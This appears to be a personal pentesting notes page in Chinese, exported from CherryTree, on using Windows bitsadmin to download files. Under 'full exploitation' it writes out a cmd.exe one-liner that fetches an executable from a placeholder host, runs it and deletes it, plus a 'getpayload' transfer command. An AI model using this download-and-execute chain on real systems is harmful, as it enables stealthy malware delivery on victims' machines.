@@ -1,0 +1,8 @@
+<!doctype html><html>
+    <head>
+      <meta http-equiv="content-type" content="text/html; charset=utf-8">
+      <title>bitsadmin</title>
+      <meta name="generator" content="CherryTree">
+      <link rel="stylesheet" href="res/styles3.css" type="text/css" />
+    </head>
+    <body><div class='page'><h1 class='title'>bitsadmin</h1><br/>win7以上<br /><br />bitsadmin 不能下载html文件	速度很慢	支持302跳转<br /><br />bitsadmin /transfer downLoadJobName <a href="http://files.cnblogs.com/files/gayhub/bcn.js">http://files.cnblogs.com/files/gayhub/bcn.js</a> C:\Users\xiaohao\Desktop\12.html<br /><br />#设置任务downLoadJobName为最高优先级<br />bitsadmin /setpriority name foreground<br /><br />可以参考：<a href="https://msdn.microsoft.com/en-us/library/aa362813(v=vs.85).aspx">https://msdn.microsoft.com/en-us/library/aa362813(v=vs.85).aspx</a><br />```<br />    1、bitsadmin /rawreturn /transfer getfile <a href="http://192.168.3.1/test.txt">http://192.168.3.1/test.txt</a> E:\file\test.txt<br />    2、bitsadmin /rawreturn /transfer getpayload <a href="http://192.168.3.1/test.txt">http://192.168.3.1/test.txt</a> E:\file\test.txt<br />```<br />完整利用:<br />```<br />cmd.exe /c bitsadmin /transfer d90f <a href="http://site.com/a">http://site.com/a</a> %APPDATA%d90f.exe&amp;%APPDATA%d90f.exe&amp;del %APPDATA%d90f.exe<br /><br /><p align="center"><img src="images\home.svg" height="22" width="22">  <a href="index.html">索引</a></p></div></body></html>
